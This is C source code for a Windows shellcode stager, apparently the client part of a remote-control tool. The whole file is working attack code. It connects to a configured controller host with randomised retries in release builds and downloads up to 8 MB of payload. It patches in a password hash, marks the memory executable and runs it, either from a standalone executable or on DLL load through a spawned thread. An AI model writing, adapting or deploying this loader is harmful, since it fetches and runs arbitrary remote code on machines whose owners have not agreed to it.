#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <time.h>
#include <assert.h>
#include <stdbool.h>
#include <stdint.h>

#ifdef _DEBUG
#include <stdio.h>
#define Mprintf printf
#define IsRelease 0
#else
#define Mprintf(format, ...) 
#define IsRelease 1
#endif
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

#pragma pack(push, 1)
typedef struct PkgHeader {
	char flag[8];
	int totalLen;
	int originLen;
} PkgHeader;
#pragma pack(pop)

PkgHeader MakePkgHeader(int originLen) {
	PkgHeader header = { 0 };
	memcpy(header.flag, "Hello?", 6);
	header.originLen = originLen;
	header.totalLen = sizeof(PkgHeader) + originLen;
	return header;
}

int GetIPAddress(const char* hostName, char* outIpBuffer, int bufferSize)
{
	struct sockaddr_in sa = {0};
	if (inet_pton(AF_INET, hostName, &(sa.sin_addr)) == 1) {
		strncpy(outIpBuffer, hostName, bufferSize - 1);
		outIpBuffer[bufferSize - 1] = '\0';
		return 0;
	}

	struct addrinfo hints = {0};
	struct addrinfo* res = NULL;
	hints.ai_family = AF_INET;  // IPv4 only
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	if (getaddrinfo(hostName, NULL, &hints, &res) != 0 || res == NULL) {
		return -1;
	}

	struct sockaddr_in* ipv4 = (struct sockaddr_in*)res->ai_addr;
	if (inet_ntop(AF_INET, &(ipv4->sin_addr), outIpBuffer, bufferSize) == NULL) {
		freeaddrinfo(res);
		return -2;
	}

	freeaddrinfo(res);
	return 0;
}

const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut) {
	if (!sIP || !sizeOut) return NULL;

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return NULL;

	char serverIP[INET_ADDRSTRLEN] = { 0 };
	if (GetIPAddress(sIP, serverIP, sizeof(serverIP)) == 0) {
		Mprintf("Resolved IP: %s\n", serverIP);
	} else {
		Mprintf("Failed to resolve '%s'.\n", sIP);
		WSACleanup();
		return NULL;
	}

	srand(time(NULL));
	const int bufSize = (8 * 1024 * 1024);
	char* buffer = NULL;
	BOOL isFirstConnect = TRUE;
	int attemptCount = 0, requestCount = 0;
	do {
		if (!isFirstConnect)
			Sleep(IsRelease ? rand()%60 * 1000 : 5000);
		isFirstConnect = FALSE;
		Mprintf("Connecting attempt #%d -> %s:%d \n", ++attemptCount, serverIP, serverPort);

		SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (clientSocket == INVALID_SOCKET)
			continue;

		DWORD timeout = 30000;
		setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

		struct sockaddr_in serverAddr = { 0 };
		serverAddr.sin_family = AF_INET;
		serverAddr.sin_port = htons(serverPort);
		serverAddr.sin_addr.s_addr = inet_addr(serverIP);
		if (connect(clientSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
			closesocket(clientSocket);
			continue;
		}

		char command[4] = { 210, sizeof(void*) == 8, 0, IsRelease };
		char req[sizeof(PkgHeader) + sizeof(command)] = { 0 };
		PkgHeader h = MakePkgHeader(sizeof(command));
		memcpy(req, &h, sizeof(PkgHeader));
		memcpy(req + sizeof(PkgHeader), command, sizeof(command));
		int bytesSent = send(clientSocket, req, sizeof(req), 0);
		if (bytesSent != sizeof(req)) {
			closesocket(clientSocket);
			continue;
		}

		int totalReceived = 0;
		buffer = buffer ? buffer : (char*)malloc(bufSize);
		if (!buffer) {
			closesocket(clientSocket);
			continue;
		}
		if (requestCount < 3) {
			requestCount++;
			const int bufferSize = 16 * 1024;
			time_t tm = time(NULL);
			while (totalReceived < bufSize) {
				int bytesToReceive = (bufferSize < bufSize - totalReceived) ? bufferSize : (bufSize - totalReceived);
				int bytesReceived = recv(clientSocket, buffer + totalReceived, bytesToReceive, 0);
				if (bytesReceived <= 0) {
					Mprintf("recv failed: WSAGetLastError = %d\n", WSAGetLastError());
					break;
				}
				totalReceived += bytesReceived;
				if (totalReceived >= sizeof(PkgHeader) && totalReceived >= ((PkgHeader*)buffer)->totalLen) {
					Mprintf("recv succeed: Cost time = %d s\n", (int)(time(NULL) - tm));
					break;
				}
			}
		} else {
			closesocket(clientSocket);
			break;
		}

		PkgHeader* header = (PkgHeader*)buffer;
		if (totalReceived != header->totalLen || header->originLen <= 6 || header->totalLen > bufSize) {
			Mprintf("Packet too short or too large: totalReceived = %d\n", totalReceived);
			closesocket(clientSocket);
			continue;
		}
		unsigned char* ptr = buffer + sizeof(PkgHeader);
		int size = 0;
		BYTE cmd = ptr[0], type = ptr[1];
		memcpy(&size, ptr + 2, sizeof(int));
		*sizeOut = size;
		if (cmd != 211 || (type != 0 && type != 1) || size <= 64 || size > bufSize) {
			closesocket(clientSocket);
			break;
		}
		closesocket(clientSocket);
		WSACleanup();
		return buffer;
	} while (1);

	free(buffer);
	WSACleanup();
	return NULL;
}

inline int MemoryFind(const char* szBuffer, const char* Key, int iBufferSize, int iKeySize)
{
	for (int i = 0; i < iBufferSize - iKeySize; ++i){
		if (0 == memcmp(szBuffer + i, Key, iKeySize)){
			return i;
		}
	}
	return -1;
}

#pragma pack(push, 4)
struct CONNECT_ADDRESS
{
	char	        szFlag[32];		 // 标识
	char			szServerIP[100]; // 主控IP
	char			szPort[8];		 // 主控端口
	int				iType;			 // 客户端类型
	bool            bEncrypt;		 // 上线信息是否加密
	char            szBuildDate[12]; // 构建日期(版本)
	int             iMultiOpen;		 // 支持打开多个
	int				iStartup;		 // 启动方式
	int				iHeaderEnc;		 // 数据加密类型
	char			protoType;		 // 协议类型
	char			runningType;	 // 运行方式
	char            szReserved[52];  // 占位，使结构体占据300字节
	uint64_t		superAdmin;		 // 管理员主控ID
	char			pwdHash[64];	 // 密码哈希
}g_Server = { "Hello, World!", "127.0.0.1", "6543" };
#pragma pack(pop)

typedef struct PluginParam {
	char IP[100];
	int Port;
	void* Exit;
	void* User;
}PluginParam;

#ifdef _WINDLL
#define DLL_API __declspec(dllexport)
#else 
#define DLL_API
#endif

extern DLL_API DWORD WINAPI run(LPVOID param) {
	PluginParam* info = (PluginParam*)param;
	int size = 0;
	const char* dllData = ReceiveShellcode(info->IP, info->Port, &size);
	if (dllData == NULL) return -1;
	void* execMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (NULL == execMem) return -2;
	char find[] = "61f04dd637a74ee34493fc1025de2c131022536da751c29e3ff4e9024d8eec43";
	int offset = MemoryFind(dllData, find, size, sizeof(find)-1);
	if (offset != -1) {
		memcpy(dllData + offset, info->User, 64);
	}
	memcpy(execMem, dllData + 22, size);
	free((void*)dllData);
	DWORD oldProtect = 0;
	if (!VirtualProtect(execMem, size, PAGE_EXECUTE_READ, &oldProtect)) return -3;

	((void(*)())execMem)();
	return 0;
}

#ifndef _WINDLL

int main() {
	assert(sizeof(struct CONNECT_ADDRESS) == 300);
	PluginParam param = { 0 };
	strcpy(param.IP, g_Server.szServerIP);
	param.Port = atoi(g_Server.szPort);
	param.User = g_Server.pwdHash;
	DWORD result = run(&param);
	Sleep(INFINITE);
	return result;
}

#else

BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	static HANDLE threadHandle = NULL;
	if (fdwReason == DLL_PROCESS_ATTACH){
		static PluginParam param = { 0 };
		strcpy(param.IP, g_Server.szServerIP);
		param.Port = atoi(g_Server.szPort);
		param.User = g_Server.pwdHash;
		threadHandle = CreateThread(NULL, 0, run, &param, 0, NULL);
	} else if (fdwReason == DLL_PROCESS_DETACH) {
		if (threadHandle) TerminateThread(threadHandle, 0x20250619);
	}
	return TRUE;
}

#endif
